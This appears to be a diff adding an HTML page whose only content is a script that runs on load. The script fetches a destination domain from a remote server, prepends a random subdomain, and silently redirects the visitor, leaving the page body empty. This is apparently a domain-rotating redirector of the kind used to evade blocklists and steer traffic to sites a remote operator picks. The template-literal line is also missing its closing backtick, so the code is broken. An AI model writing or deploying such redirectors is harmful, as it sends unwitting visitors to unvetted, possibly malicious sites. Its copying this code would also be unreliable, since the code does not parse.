@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        fetch('https://shop.co.pgylxz302.me/get_links.php')
+            .then(response => response.text())
+            .then(domain => {
+                domain = domain.trim();
+                
+                // 生成4位随机字母（a-z）
+                const random4Char = () => {
+                    return Math.random().toString(36).substring(2, 6);
+                };
+                const subdomain = random4Char(); // 如 "ab3f"
+                
+                // 如果没有协议，自动补全 https://
+                if (!domain.startsWith('http')) {
+                    domain = 'https://' + domain;
+                }
+                
+                // 解析域名，插入随机子域名
+                const url = new URL(domain);
+                url.hostname = `${subdomain}.${url.hostname};
+                
+                // 跳转到新URL
+                window.location.href = url.toString();
+            });
+    </script>
+</head>
+<body>
+    <!-- 可以留空或显示加载提示 -->
+</body>
+</html>
